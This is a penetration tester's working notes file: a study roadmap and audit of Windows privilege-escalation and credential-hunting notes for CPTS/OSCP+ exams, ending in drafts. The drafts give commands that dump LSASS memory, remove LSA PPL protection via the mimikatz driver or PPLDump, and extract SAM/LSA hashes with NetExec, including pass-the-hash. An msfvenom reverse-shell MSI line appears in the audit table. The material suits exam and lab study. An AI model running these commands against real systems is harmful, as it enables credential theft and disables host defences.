---
created: 2026-08-11
updated: 2026-10-11
---
- [ ] Registry hives
- [ ] LSA secrets
- [ ] potatoes
- [ ] Citrix
- [ ] Credential hunting
- [ ] .NET `VIEWSTATE` insecure deserialization, the exploit in the `Pov` HTB machine

---

- `## References and further reading` must list absolutely all links in the article EXCEPT links to tools, in the order they are mentioned in the article.
---

- [ ] Check for duplicates all notes with 🛠️
- [ ] Based on recon methodology, how do I create Windows PrivEsc methodology?
- 📁 **Windows PrivEsc**
	- 📝 [[🛠️ Auto-start extensibility points]]
	- 📁 **Enumeration & Discovery**
		- 📝 [[Manual & automated Windows enumeration]]
		- 📝 [[🛠️ Windows kernel exploits]]
	- 📁 **Service Misconfigurations**
		- 📝 [[Weak service DACLs]]
		- 📝 [[Unquoted service paths]]
		- 📝 [[DLL hijacking|DLL hijacking]]
	- 📁 **Registry Misconfigurations**
		- 📝 [[AlwaysInstallElevated]]
		- 📝 [[Service registry key misconfigurations]]
	- 📁 **Privileges**
		- 📝 [[SeDebugPrivilege]]
		- 📝 [[SeTakeOwnershipPrivilege]]
		- 📝 [[SeBackupPrivilege & SeRestorePrivilege]]
		- 📝 [[SeLoadDriverPrivilege]]
	- 📁 **Potato Attacks**
		- 📝 `GodPotato`
		- 📝 `JuicyPotato`
		- 📝 `PrintSpoofer`
		- 📝 `RoguePotato`
		- 📝 `SweetPotato`
		- 📝 `LocalPotato & EfxPotato`
	- 📁 **Privileged Groups**
		- 📝 `Backup Operators`
		- 📝 `DnsAdmins`
		- 📝 `Event Log Readers`
		- 📝 `Print Operators`
		- 📝 `Server Operators`
		- 📝 `Hyper-V Administrators`
		- 📝 `WinRM-RDP Operators`
	- 📁 **Credential Harvesting**
	
	- 📁 ~~UAC Bypass~~ (out-of-scope)
	- 📁 ~~Scheduled Tasks~~ (out-of-scope)
	- 📁 ~~WSL & Special Environments~~ (out-of-scope)

- 📁 Windows Credential Hunting & Post-Exploitation
	- 📁 Credential Hunting
	- 📁 Credential Dumping
	- 📁 Local Persistence 
	- 📁 Pivoting & Network Post-Exploitation


```
content/Windows/
├── Windows PrivEsc/
│   ├── 01 - Enumeration & Discovery/
│   │   ├── 🛠️ Automated & Manual Windows Enumeration.md   [PRESENT - Needs Refactor]
│   │   └── 🛠️ Kernel Exploits & Patch Analysis.md         [MISSING]
│   ├── 02 - Service Misconfigurations/
│   │   ├── 🛠️ Weak Service Permissions & DACLs.md         [PRESENT in Weak service permissions.md]
│   │   ├── 🛠️ Unquoted Service Paths.md                    [PRESENT in Weak service permissions.md - Split out]
│   │   └── 🛠️ DLL Hijacking & Search Order Exploitation.md [STUB - Needs Full Rewrite]
│   ├── 03 - Registry Misconfigurations/
│   │   ├── 🛠️ AlwaysInstallElevated.md                     [MISSING]
│   │   ├── 🛠️ Autoruns & IFEO Debugger Hijacking.md       [MISSING]
│   │   └── 🛠️ Modifying Service Registry Keys.md           [MISSING]
│   ├── 04 - Token Impersonation & Privileges/
│   │   ├── 🛠️ Access Tokens & Impersonation Mechanics.md  [RENAME from SeImpersonatePrivilge stub]
│   │   ├── 🛠️ SeDebugPrivilege.md                          [PRESENT - Needs Refactor]
│   │   ├── 🛠️ SeTakeOwnershipPrivilege.md                  [PRESENT - Clean]
│   │   ├── 🛠️ SeBackupPrivilege & SeRestorePrivilege.md   [PRESENT in Backup Operators]
│   │   └── Potato Attacks/
│   │       ├── 🛠️ Potato Attacks Overview & OS Matrix.md   [MISSING - Unifying Matrix]
│   │       ├── GodPotato.md                                [PRESENT]
│   │       ├── JuicyPotato.md                              [PRESENT]
│   │       ├── PrintSpoofer.md                             [PRESENT]
│   │       ├── RoguePotato.md                              [PRESENT]
│   │       ├── SweetPotato.md                              [PRESENT]
│   │       └── LocalPotato & EfxPotato.md                  [MISSING]
│   ├── 05 - Abusing Privileged Groups/
│   │   ├── Backup Operators.md                             [PRESENT]
│   │   ├── DnsAdmins.md                                    [PRESENT]
│   │   ├── Event Log Readers.md                            [PRESENT]
│   │   ├── Print Operators.md                              [PRESENT]
│   │   ├── Server Operators.md                             [PRESENT]
│   │   └── Hyper-V & WinRM-RDP Operators.md               [MISSING]
│   ├── 06 - UAC Bypass/
│   │   └── 🛠️ UAC Bypass Techniques & Auto-Elevate.md     [MISSING]
│   ├── 07 - Scheduled Tasks & Startup Hijacking/
│   │   └── 🛠️ Scheduled Tasks & Startup Applications.md   [MISSING]
│   └── 08 - WSL & Special Environments/
│       └── 🛠️ WSL PrivEsc & Host Escalation.md             [MISSING]
│
└── Windows Credential Hunting & Post-Exploitation/
    ├── 01 - Credential Mining/
    │   ├── 🛠️ Cleartext File System Credential Mining.md    [PRESENT in Windows credential hunting.md]
    │   ├── 🛠️ Group Policy Preferences (GPP) & Registry.md  [MISSING - Dedicated Guide]
    │   └── 🛠️ DPAPI Master Keys & Credential Vaults.md      [PRESENT - High Quality]
    ├── 02 - LSASS & Hive Extraction/
    │   ├── 🛠️ Dumping LSASS Memory & Evasion (PPL/VBS).md   [STUB - Needs Full Creation]
    │   └── 🛠️ Extracting SAM, SYSTEM & SECURITY Hives.md   [MISSING]
    ├── 03 - Token Theft & Access Manipulation/
    │   └── 🛠️ Token Theft & Process Impersonation.md        [MISSING]
    ├── 04 - Local Persistence/
    │   └── 🛠️ Windows Local Persistence Techniques.md       [MISSING]
    └── 05 - Pivoting & Network Post-Exploitation/
        └── 🛠️ Host Recon, Port Forwarding & Pivoting.md   [MISSING]
```

---








# Windows PrivEsc & Post-Exploitation: CPTS & OSCP+ Master Roadmap & Quality Audit

**Persona**: Senior Penetration Tester (10+ Years Exp | CPTS, OSCP+, OSCE, GXPN)  
**Target Scope**:

1. `content/Windows/Windows PrivEsc`
2. `content/Windows/Windows Credential Hunting & Post-Exploitation`  
    **Objective**: Provide an exhaustive, practical, exam-ready master index covering 100% of CPTS and OSCP/OSCP+ exam requirements for Windows local privilege escalation, credential mining, and host post-exploitation.


## 1. Executive Summary & Audit Assessment

A recursive audit of the target directories identified **20 existing Markdown files** across 5 subdirectories. While certain files (such as `Weak service permissions.md`, `Windows credential hunting.md`, and `🛠️ DPAPI credentials.md`) contain substantial detail, the repository currently suffers from structural fragmentation, critical missing domain topics, empty stubs, and inconsistent organization:

### Key Findings & Structural Flaws

1. **Empty Stubs & Broken References**:
    - `Abusing Privileges/🛠️ SeImpersonatePrivilge and SeAssignPrimaryToken.md` (79 bytes — **Empty stub** with a typo in the filename: `Privilge` missing `e`).
    - `🛠️ DLL injection.md` (99 bytes — **Empty stub**).
    - `◯ LSASS memory dumping.md` (86 bytes in PrivEsc — **Empty stub**).
    - `🛠️ Dumping LSASS memory.md` (79 bytes in Credential Hunting — **Empty stub**).
2. **Duplicated & Split LSASS Coverage**:
    - LSASS memory dumping is split across two empty stubs in separate folders. LSASS dumping is one of the most heavily tested topics in CPTS and OSCP+; it requires a single, master technical guide under Credential Hunting, cross-referenced from PrivEsc.
3. **Unstructured "Mega-Notes"**:
    - `Weak service permissions.md` (30 KB, 783 lines) and `Windows credential hunting.md` (33 KB, 947 lines) combine multiple distinct attack primitives into single huge documents. For time-sensitive exam scenarios (OSCP+/CPTS), these need clear modular separation or strict heading hierarchies with quick-reference command blocks at the top.
4. **Critical Exam Topics Completely Missing**:
    - **AlwaysInstallElevated** (`HKCU` & `HKLM` MSI execution).
    - **UAC Bypass Mechanics & Modern Exploitation** (`fodhelper`, `sdclt`, `silentcleanup`, COM object hijacking).
    - **SAM, SYSTEM, & SECURITY Hive Extraction** (`reg save`, Shadow Copies, `secretsdump.py`, LSA Secrets).
    - **Group Policy Preferences (GPP)** `cpassword` decryption (`gpp-decrypt`).
    - **Kernel Exploits & BYOVD** (WES-NG/Watson workflow, CVE-2021-36934 SeriousSAM, PrintNightmare local EOP, CVE-2023-21768, `RTCore64.sys`).
    - **Scheduled Tasks & Startup App Hijacking** (`schtasks`, script hijacking).
    - **WSL (Windows Subsystem for Linux) Host Escalation**.
    - **Local Persistence Techniques** (Registry Run keys, custom services, accessibility hijacking `sethc`/`utilman`).
    - **Host Reconnaissance, Port Forwarding & Pivoting** (`netsh portproxy`, Chisel, Ligolo-ng).

---

## 2. Proposed Standardized Folder Architecture

To align with Quartz / Obsidian note-linking best practices and provide instant navigation during exams, the folders should be restructured as follows:

- 📁 Windows PrivEsc
	- 📁 Enumeration & Discovery
		- 📝 [[Manual & automated Windows enumeration]]
		- 📝 [[🛠️ Windows kernel exploits]]
	- 📁 Service Misconfigurations
		- 📝 [[Weak service DACLs]]
		- 📝 [[Unquoted service paths]]
		- 📝 [[DLL hijacking|DLL hijacking]]
	- 📁 Registry Misconfigurations
		- 📝 `AlwaysInstallElevated`
		- 📝 Autoruns 
		- 📝 Modifying service registry keys
	- 📁 Token Impersonation & Privileges 
		- 📝 `SeImpersonationPrivilege` and token impersonation
		- 📝 `SeDebugPrivilege`
		- 📝 `SeTakeOwnerShipPrivilege`
		- 🔗 `SeBackupPrivilege & SeRestorePrivilege` -> `Backup Operators`
		- 📁 Potato Attacks
			- 📝 `GodPotato`
			- 📝 `JuicyPotato`
			- 📝 `PrintSpoofer`
			- 📝 `RoguePotato`
			- 📝 `SweetPotato`
			- 📝 `LocalPotato & EfxPotato`
	- 📁 Privileged Groups
		- 📝 `Backup Operators`
		- 📝 `DnsAdmins`
		- 📝 `Event Log Readers`
		- 📝 `Print Operators`
		- 📝 `Server Operators`
		- 📝 `Hyper-V Administrators`
		- 📝 `WinRM-RDP Operators`
	- 📁 ~~UAC Bypass~~ (out-of-scope)
	- 📁 ~~Scheduled Tasks~~ (out-of-scope)
	- 📁 ~~WSL & Special Environments~~ (out-of-scope)
- 📁 Windows Credential Hunting & Post-Exploitation
	- 📁 Credential Hunting
	- 📁 Credential Dumping
	- 📁 Local Persistence 
	- 📁 Pivoting & Network Post-Exploitation


```
content/Windows/
├── Windows PrivEsc/
│   ├── 01 - Enumeration & Discovery/
│   │   ├── 🛠️ Automated & Manual Windows Enumeration.md   [PRESENT - Needs Refactor]
│   │   └── 🛠️ Kernel Exploits & Patch Analysis.md         [MISSING]
│   ├── 02 - Service Misconfigurations/
│   │   ├── 🛠️ Weak Service Permissions & DACLs.md         [PRESENT in Weak service permissions.md]
│   │   ├── 🛠️ Unquoted Service Paths.md                    [PRESENT in Weak service permissions.md - Split out]
│   │   └── 🛠️ DLL Hijacking & Search Order Exploitation.md [STUB - Needs Full Rewrite]
│   ├── 03 - Registry Misconfigurations/
│   │   ├── 🛠️ AlwaysInstallElevated.md                     [MISSING]
│   │   ├── 🛠️ Autoruns & IFEO Debugger Hijacking.md       [MISSING]
│   │   └── 🛠️ Modifying Service Registry Keys.md           [MISSING]
│   ├── 04 - Token Impersonation & Privileges/
│   │   ├── 🛠️ Access Tokens & Impersonation Mechanics.md  [RENAME from SeImpersonatePrivilge stub]
│   │   ├── 🛠️ SeDebugPrivilege.md                          [PRESENT - Needs Refactor]
│   │   ├── 🛠️ SeTakeOwnershipPrivilege.md                  [PRESENT - Clean]
│   │   ├── 🛠️ SeBackupPrivilege & SeRestorePrivilege.md   [PRESENT in Backup Operators]
│   │   └── Potato Attacks/
│   │       ├── 🛠️ Potato Attacks Overview & OS Matrix.md   [MISSING - Unifying Matrix]
│   │       ├── GodPotato.md                                [PRESENT]
│   │       ├── JuicyPotato.md                              [PRESENT]
│   │       ├── PrintSpoofer.md                             [PRESENT]
│   │       ├── RoguePotato.md                              [PRESENT]
│   │       ├── SweetPotato.md                              [PRESENT]
│   │       └── LocalPotato & EfxPotato.md                  [MISSING]
│   ├── 05 - Abusing Privileged Groups/
│   │   ├── Backup Operators.md                             [PRESENT]
│   │   ├── DnsAdmins.md                                    [PRESENT]
│   │   ├── Event Log Readers.md                            [PRESENT]
│   │   ├── Print Operators.md                              [PRESENT]
│   │   ├── Server Operators.md                             [PRESENT]
│   │   └── Hyper-V & WinRM-RDP Operators.md               [MISSING]
│   ├── 06 - UAC Bypass/
│   │   └── 🛠️ UAC Bypass Techniques & Auto-Elevate.md     [MISSING]
│   ├── 07 - Scheduled Tasks & Startup Hijacking/
│   │   └── 🛠️ Scheduled Tasks & Startup Applications.md   [MISSING]
│   └── 08 - WSL & Special Environments/
│       └── 🛠️ WSL PrivEsc & Host Escalation.md             [MISSING]
│
└── Windows Credential Hunting & Post-Exploitation/
    ├── 01 - Credential Mining/
    │   ├── 🛠️ Cleartext File System Credential Mining.md    [PRESENT in Windows credential hunting.md]
    │   ├── 🛠️ Group Policy Preferences (GPP) & Registry.md  [MISSING - Dedicated Guide]
    │   └── 🛠️ DPAPI Master Keys & Credential Vaults.md      [PRESENT - High Quality]
    ├── 02 - LSASS & Hive Extraction/
    │   ├── 🛠️ Dumping LSASS Memory & Evasion (PPL/VBS).md   [STUB - Needs Full Creation]
    │   └── 🛠️ Extracting SAM, SYSTEM & SECURITY Hives.md   [MISSING]
    ├── 03 - Token Theft & Access Manipulation/
    │   └── 🛠️ Token Theft & Process Impersonation.md        [MISSING]
    ├── 04 - Local Persistence/
    │   └── 🛠️ Windows Local Persistence Techniques.md       [MISSING]
    └── 05 - Pivoting & Network Post-Exploitation/
        └── 🛠️ Host Recon, Port Forwarding & Pivoting.md   [MISSING]
```

---

## 3. Directory 1: Windows PrivEsc — Master Topic Index & Quality Audit

### Module 1.1: System Enumeration & Patch Analysis

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Windows enumeration.md**|`[PRESENT]`|Covers basic OS info, processes, routes. **Flaws**: Lacks tool-based speed workflow; missing AV/EDR checks, AppLocker policies, mounted drives, LAPS status.|**Refactor**: Add instant 5-minute Cmd/PS triage cheat-sheet (`netstat`, `tasklist /svc`, `sc query`, `Get-MpComputerStatus`). Include WinPEAS / Seatbelt / PrivescCheck output parsing tips.|
|**Kernel Exploits & Patch Analysis**|`[MISSING]`|**None**. Vulnerabilities like SeriousSAM (CVE-2021-36934), PrintNightmare (CVE-2021-34527), and AFD.sys (CVE-2023-21768) are exam staples.|**Create**: Document WES-NG and Watson usage. Provide exact compilation & payload delivery instructions for classic exam CVEs (MS16-032, MS17-010, CVE-2020-1054, CVE-2021-36934).|

### Module 1.2: Service Misconfigurations

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Weak service permissions.md**|`[PRESENT]`|30 KB mega-note covering DACLs, unquoted paths, binary replacement. **Flaws**: Cluttered formatting; lacks clear distinction between binary path vs file permission vs service DACL (`sc config`).|**Refactor**: Split into 3 modular sub-notes or clean up with visual headers: (1) Service DACLs (`sc config binPath`), (2) Weak File Permissions on Executables, (3) Unquoted Service Paths. Add `cmd.exe /c` payload wrappers to prevent service timeouts.|
|**DLL Injection / Hijacking**|`[STUB]`|99-byte empty file.|**Rewrite**: Rename to `DLL Hijacking & Search Order Exploitation.md`. Detail KnownDLLs registry, DLL search order (`AppDir` -> `System32` -> `System` -> `CurrentDir` -> `PATH`), missing DLLs in standard services (Phantom DLLs), and C/C++ skeleton code for malicious DLLs executing `system()`.|

### Module 1.3: Registry Misconfigurations

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**AlwaysInstallElevated**|`[MISSING]`|**None**. Extremely common in OSCP/CPTS labs.|**Create**: Detail registry check (`reg query HKLM...AlwaysInstallElevated` & `HKCU...`), MSI payload generation (`msfvenom -p windows/x64/shell_reverse_tcp -f msi`), and silent execution (`msiexec /quiet /qn /i c:\temp\payload.msi`).|
|**Autoruns & IFEO Debugger Hijacking**|`[MISSING]`|**None**.|**Create**: Cover autorun keys in `HKLM`/`HKCU`, replacing target binaries, and Image File Execution Options (IFEO) registry key hijacking (`Debugger` value abuse for `sethc.exe` or `utilman.exe`).|
|**Modifying Service Registry Keys**|`[MISSING]`|**None**.|**Create**: Document abusing write access to `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` (`ImagePath` modification via `reg add` or PowerShell).|

### Module 1.4: Abusing Privileges & Access Tokens

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**SeImpersonatePrivilge & SeAssignPrimaryToken**|`[STUB]`|79-byte stub with typo in title (`SeImpersonatePrivilge`).|**Rewrite**: Rename to `Access Tokens & Impersonation Mechanics.md`. Explain Token Architecture (Primary vs Delegation), Impersonation Levels (SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation), and map out Potato exploits.|
|**SeDebugPrivilege.md**|`[PRESENT]`|Covers LSASS dumping & parent process spoofing. **Flaws**: Misses the main SYSTEM token stealing/injection mechanism.|**Refactor**: Add token stealing via Incognito (`incognito.exe`), Mimikatz `token::elevate`, and injecting shellcode directly into `winlogon.exe` (PID targeting).|
|**SeTakeOwnershipPrivilege.md**|`[PRESENT]`|Good coverage of `takeown` and `icacls`. **Flaws**: Lacks exam context for service file hijacking.|**Refactor**: Add step-by-step walkthrough for taking ownership of protected service binaries (e.g. `utilman.exe`, custom service binaries) and resetting DACLs.|
|**SeBackupPrivilege & SeRestorePrivilege**|`[PRESENT]`|Located in `Backup Operators`. Good detail on `diskshadow` and `reg save`.|**Refactor**: Ensure stand-alone privilege reference is linked cleanly. Add `robocopy /b` usage and manual DLL injection via `SeRestorePrivilege` (writing into `C:\Windows\System32`).|

### Module 1.5: Potato Attacks Evolution

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Potato Attacks Overview & Matrix**|`[MISSING]`|Individual potato notes exist, but **no top-level selection matrix**.|**Create**: A master selection matrix based on Windows Version (Win 7 to Win 11 / Server 2022), Port 135 availability, RPC requirements, and DCOM object behavior.|
|**JuicyPotato.md**|`[PRESENT]`|17 KB file. Good breakdown of CLSIDs. **Flaws**: Needs clear warning that it fails on Win 10 1809+ / Server 2019+.|**Refactor**: Highlight Windows OS boundaries clearly at top of note.|
|**PrintSpoofer.md**|`[PRESENT]`|6 KB file. Clear explanations.|**Maintain**: Add syntax for `PrintSpoofer.exe -i -c cmd.exe` and pipe creation mechanisms.|
|**RoguePotato.md**|`[PRESENT]`|7.8 KB file. Explains fake OXID resolver.|**Maintain**: Clarify redirecting RPC traffic to attacker machine (requires port 135 listening on attacker IP).|
|**GodPotato.md**|`[PRESENT]`|5 KB file. Explains DCOM `ObjRef` HTTP trigger.|**Maintain**: Emphasize that GodPotato works on modern Windows (Win 11, Server 2022) without requiring port 135 listening or CLSID brute-forcing.|
|**SweetPotato.md**|`[PRESENT]`|2.8 KB file. Summarizes automation wrapper.|**Maintain**: Keep as summary wrapper note.|
|**LocalPotato & EfxPotato**|`[MISSING]`|**None**.|**Create**: Document LocalPotato (SMB to HTTP/RPC local relay, bypasses Win 11 / Server 2022 fixes for unprivileged users) and EfxPotato.|

### Module 1.6: Abusing Windows Groups

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Backup Operators**|`[PRESENT]`|Solid detail on `diskshadow` / `reg save`.|**Maintain**: Cross-link with `SeBackupPrivilege`.|
|**DnsAdmins.md**|`[PRESENT]`|Solid detail on `ServerLevelPluginDll`.|**Maintain**: Add cleanup command (`dnscmd /config /serverlevelplugindll`).|
|**Event Log Readers.md**|`[PRESENT]`|Good coverage of Security event log hunting.|**Maintain**: Add `wevtutil` command examples for hunting process creation (Event ID 4688) with command-line arguments.|
|**Print Operators.md**|`[PRESENT]`|Detail on `SeLoadDriverPrivilege`. **Flaws**: C++ code is verbose.|**Refactor**: Add modern driver load binaries (`EopLoadDriver`) to simplify exam execution.|
|**Server Operators.md**|`[PRESENT]`|Covers service binary modification.|**Maintain**: Clean up command syntax.|
|**Hyper-V & Remote Management Users**|`[MISSING]`|**None**.|**Create**: Document Hyper-V Admins (mounting VHDs, VM access) and Remote Management Users / RDP Users (Evil-WinRM, xfreerdp access).|

### Module 1.7 - 1.10: Advanced & Specialized Escalation

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**UAC Bypass Techniques**|`[MISSING]`|**None**. Critical for CPTS & OSCP+.|**Create**: Detail UAC Integrity Levels (Medium vs High), Auto-Elevate binaries (`fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe`), Registry hijacking (`HKCU\Software\Classes\ms-settings\Shell\Open\command`), and `silentcleanup` task environment variable expansion.|
|**Scheduled Tasks & Startup Hijacking**|`[MISSING]`|**None**.|**Create**: Detail task enumeration (`schtasks /query /v /fo LIST`), searching for writable task scripts/binaries, missing binary execution, and `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` hijacking.|
|**WSL PrivEsc & Host Escalation**|`[MISSING]`|**None**.|**Create**: Document detecting WSL (`wsl -l -v`), escalating to root inside WSL (`sudo su` without password or CVEs), and leveraging `/mnt/c/` access to write Windows startup scripts or extract host credentials.|

---

## 4. Directory 2: Windows Credential Hunting & Post-Exploitation — Master Topic Index & Quality Audit

### Module 2.1: File System & Cleartext Credential Mining

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Windows credential hunting.md**|`[PRESENT]`|33 KB mega-note covering IIS, `web.config`, PS history, WiFi, sticky notes. **Flaws**: Unstructured; lacks quick copy-paste command blocks; missing KeePass databases (`.kdbx`) and automated credential tools.|**Refactor**: Add executive summary table with top 10 search commands (`findstr`, PowerShell `Get-ChildItem`). Include KeePass master key/hash extraction (`keepass2john`). Document automated tools (LaZagne, Snaffler, SessionGopher).|
|**Group Policy Preferences (GPP)**|`[MISSING]`|Mentioned briefly in mega-note, but no dedicated operational guide.|**Create**: Document searching `SYSVOL` for `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, extracting `cpassword`, and decrypting with `gpp-decrypt` or `Get-GPPPassword`. Explain MS14-025 patch context.|
|**DPAPI Credentials.md**|`[PRESENT]`|23 KB file. High technical depth on Master Keys, Chrome passwords, Vaults.|**Maintain**: Add quick-command reference box at top for exam speed (`SharpDPAPI.exe`, `mimikatz dpapi::cred`).|

### Module 2.2: LSASS Memory Dumping & Registry Hives

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Dumping LSASS Memory & Evasion**|`[STUB]`|79-byte empty stub. **CRITICAL MISSING DOMAIN**.|**Create**: Master guide covering: (1) `comsvcs.dll` `MiniDump`, (2) `Procdump`, (3) Task Manager, (4) PowerShell `Out-Minidump`, (5) `SQLDumper.exe`, (6) Offline parsing with Mimikatz `sekurlsa::minidump` & Pypykatz, (7) LSA Protection (PPL) bypass via BYOVD driver (`RTCore64.sys` / `mimidrv.sys`), (8) Credential Guard limitations.|
|**Extracting SAM, SYSTEM & SECURITY Hives**|`[MISSING]`|**None**. Essential for offline local hash extraction.|**Create**: Document dumping hives via `reg save HKLM\SAM`, `vssadmin` shadow copy, `diskshadow`. Parsing offline using `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL` or Mimikatz `lsadump::sam`. LSA Secrets extraction (`lsadump::secrets`).|

### Module 2.3 - 2.5: Token Theft, Persistence & Pivoting

|Topic / Note Title|Status|Existing Quality & Critical Flaws|CPTS/OSCP+ Required Content & Action Plan|
|---|---|---|---|
|**Token Theft & Access Manipulation**|`[MISSING]`|**None**.|**Create**: Detail process handle opening, token duplication (`DuplicateTokenEx`), Incognito module (`list_tokens -u`, `impersonate_token`), Mimikatz `token::elevate`, and spawning processes under stolen identity.|
|**Windows Local Persistence Techniques**|`[MISSING]`|**None**. Essential post-exploitation topic for CPTS.|**Create**: Detail registry autoruns (`HKCU/.../Run`), service creation (`sc create`), scheduled task creation, accessibility hijacking (`sethc.exe`/`utilman.exe`), and WMI event subscriptions.|
|**Host Recon, Port Forwarding & Pivoting**|`[MISSING]`|**None**. Core requirement for multi-homed exam targets.|**Create**: Document internal port scanning (`netstat -ano`, `Get-NetTCPConnection`), local port forwarding with `netsh interface portproxy`, SSH dynamic/remote tunneling (`plink.exe`), Chisel, and Ligolo-ng setup on Windows hosts.|

---

## 5. Summary Action Plan & Execution Priority

To achieve complete domain coverage for CPTS and OSCP+ exams, follow this prioritized roadmap:

### Phase 1: High Priority (Immediate Exam Blockers)

1. **LSASS Memory Dumping**: Create `🛠️ Dumping LSASS Memory & Evasion (PPL/VBS).md` (Fill empty stub).
2. **SAM & SYSTEM Hive Extraction**: Create `🛠️ Extracting SAM, SYSTEM & SECURITY Hives.md`.
3. **UAC Bypass**: Create `🛠️ UAC Bypass Techniques & Auto-Elevate.md`.
4. **AlwaysInstallElevated**: Create `🛠️ AlwaysInstallElevated.md`.
5. **Potato Attacks Matrix**: Create `🛠️ Potato Attacks Overview & OS Matrix.md` and rename `SeImpersonatePrivilge` stub to `🛠️ Access Tokens & Impersonation Mechanics.md`.

### Phase 2: Medium Priority (Core Domain Refactoring)

1. **DLL Hijacking**: Rewrite empty `🛠️ DLL injection.md` into `🛠️ DLL Hijacking & Search Order Exploitation.md`.
2. **Weak Service Permissions Refactor**: Split/Re-structure `Weak service permissions.md` into modular sections with payload timeout wrappers.
3. **Group Policy Preferences (GPP)**: Create dedicated `🛠️ Group Policy Preferences (GPP) & Registry.md` guide.
4. **Kernel Exploits**: Create `🛠️ Kernel Exploits & Patch Analysis.md` (WES-NG, Watson, SeriousSAM, PrintNightmare).

### Phase 3: Post-Exploitation Completeness

1. **Local Persistence**: Create `🛠️ Windows Local Persistence Techniques.md`.
2. **Token Theft & Injection**: Create `🛠️ Token Theft & Process Impersonation.md`.
3. **Host Pivoting & Port Forwarding**: Create `🛠️ Host Recon, Port Forwarding & Pivoting.md`.
4. **WSL Host Escalation**: Create `🛠️ WSL PrivEsc & Host Escalation.md`.
	- **Stealing privileged access tokens**
		- Using kernel memory read/write primitives exposed by the driver to traverse active `EPROCESS` structures, locate the `System` process (PID `4`), and copy its primary token to your current process.
	- **Disabling Protected Process Light (PPL)**
		- Using arbitrary kernel write operations to zero out the `_PS_PROTECTION` field of `lsass.exe`, allowing credential dumping tools to read LSASS memory.
	- **Tampering with EDR kernel callbacks**
		- Modifying kernel routine pointer arrays (`PspCreateProcessNotifyRoutine`, `ObRegisterCallbacks`) to disable defensive monitoring.
# drafts
### Using `Out-Minidump` (PowerSploit)

- To generate process memory dumps you can also use [`Out-Minidump`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) (PowerSploit):

```powershell
Import-Module .\Out-Minidump.ps1
```

```powershell
Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp\lsass.dmp
```

## Bypassing LSA Protection (PPL)

- Active LSA Protection blocks user-mode processes from opening handles to `lsass.exe` with `PROCESS_VM_READ` rights.
- Bypassing PPL requires loading a signed kernel driver to modify process protection flags inside kernel memory structures (`EPROCESS`).

### Bypassing PPL via BYOVD kernel drivers

- Bring Your Own Vulnerable Driver (BYOVD) attacks load signed kernel drivers (such as Mimikatz `mimidrv.sys` or Micro-Star `RTCore64.sys`) to perform arbitrary kernel memory reads and writes.
- Load `mimidrv.sys` with Mimikatz to strip the PPL protection flag from `lsass.exe`:

```powershell
# Install Mimikatz kernel driver
mimikatz.exe "privilege::debug" "ksmodule::install mimidrv.sys" exit

# Remove PPL protection flag from LSASS process
mimikatz.exe "kernel::add-mimidrv" "process::protect /process:lsass.exe /remove" exit
```

| Module / Flag | Description |
| :--- | :--- |
| `ksmodule::install` | Registers and starts kernel driver service. |
| `kernel::add-mimidrv` | Connects Mimikatz user-mode client to `mimidrv` kernel driver. |
| `process::protect /remove` | Patches `PS_PROTECTION` byte in `lsass.exe` kernel `EPROCESS` structure to `0`. |

- Once PPL protection is stripped, standard memory dump utilities (`comsvcs.dll`, `procdump`, Mimikatz) open handles to `lsass.exe` without access denial errors.

### Bypassing PPL via `PPLDump`

- `PPLDump` exploits user-mode DLL injection into an autoelevated protected process to bypass PPL without installing custom kernel drivers.
- Run `PPLDump` against the LSASS PID:

```powershell
.\PPLDump.exe <LSASS_PID> C:\Temp\lsass.dmp
```

| Flag / Argument | Description |
| :--- | :--- |
| `<LSASS_PID>` | Numeric process ID of target `lsass.exe`. |
| `C:\Temp\lsass.dmp` | Destination file path for generated minidump. |



# DRAFTS

- The `SAM` and `SYSTEM` hives together allow you to decrypt and recover local user account NT hashes.
- The `SECURITY` and `SYSTEM` hives together allow you to decrypt and recover protected LSA secrets and cached domain credentials.

> [!tip]+
> - You can crack extracted hashes offline using [[Hashcat]] or [[🛠️ JohnTheRipper]], or use them directly in [[Pass-the-Hash]] attacks.




### NetExec

- NetExec connects to the target over SMB, exports the hives, and extracts credentials in a single command.
- Extract SAM hashes and LSA secrets using plaintext domain credentials:

```bash
netexec smb 10.10.11.5 -d example.com -u jdoe -p 'passwd123' --sam
```

```bash
netexec smb 10.10.11.5 -d example.com -u jdoe -p 'passwd123' --lsa
```

- Authenticate with local accounts:

```bash
netexec smb 10.10.11.5 --local-auth -u Administrator -p 'passwd123' --sam
```

- Authenticate with Pass-the-Hash:

```bash
netexec smb 10.10.11.5 -d example.com -u jdoe -H 31d6cfe0d16ae931b73c59d7e0c089c0 --sam
```

- Authenticate with Kerberos Pass-the-Ticket:

```bash
netexec smb 10.10.11.5 -k --sam
```

| Option | Description |
| :--- | :--- |
| `-d` | Target Active Directory domain name. |
| `-u` | Target username. |
| `-p` | Password for target user. |
| `-H` | NTLM hash for Pass-the-Hash authentication. |
| `--local-auth` | Authenticate with a local account instead of a domain account. |
| `-k` | Use Kerberos ticket from `KRB5CCNAME` for authentication. |
| `--sam` | Dump and decrypt SAM database hashes. |
